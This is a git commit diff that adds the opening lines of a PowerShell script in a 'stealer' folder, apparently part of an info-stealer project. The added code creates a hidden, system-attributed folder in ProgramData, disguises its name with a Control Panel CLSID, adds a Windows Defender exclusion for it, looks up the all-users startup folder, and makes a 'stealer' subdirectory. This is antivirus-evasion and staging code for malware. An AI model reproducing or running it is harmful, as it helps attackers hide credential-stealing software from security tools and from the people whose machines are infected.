8b05516f4b4e62147921b59326e916df7e3f521a
43a1723 <hai1723notgay@gmail.com>
2025-01-15 13:58:10 +0700

    Update main.ps1

--- stealer/main.ps1
+++ stealer/main.ps1
@@ -1,1 +1,10 @@
 
+$rdir = "$env:SystemDrive\ProgramData\Loader"
+$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
+New-Item -ItemType Directory -Path $dir
+Add-MpPreference -ExclusionPath $dir
+attrib +h +s $dir
+
+$stealer = "$dir\stealer"
+New-Item -ItemType Directory -Path $stealer
